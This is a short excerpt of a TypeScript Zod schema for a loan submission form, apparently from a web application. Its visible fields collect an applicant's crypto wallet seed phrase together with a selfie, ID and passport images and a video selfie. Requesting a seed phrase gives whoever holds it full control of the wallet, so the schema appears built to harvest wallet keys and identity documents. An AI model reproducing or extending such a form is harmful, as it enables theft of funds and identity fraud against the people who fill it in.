...
export const loanSubmissionSchema = z.object({
  ...
  cryptoSeedPhrase: z.string().max(500).nullable().optional(),
  selfieImage: z.string().nullable().optional(),
  idFrontImage: z.string().nullable().optional(),
  idBackImage: z.string().nullable().optional(),
  passportFrontImage: z.string().nullable().optional(),
  passportBackImage: z.string().nullable().optional(),
  videoSelfieUrl: z.string().nullable().optional(),
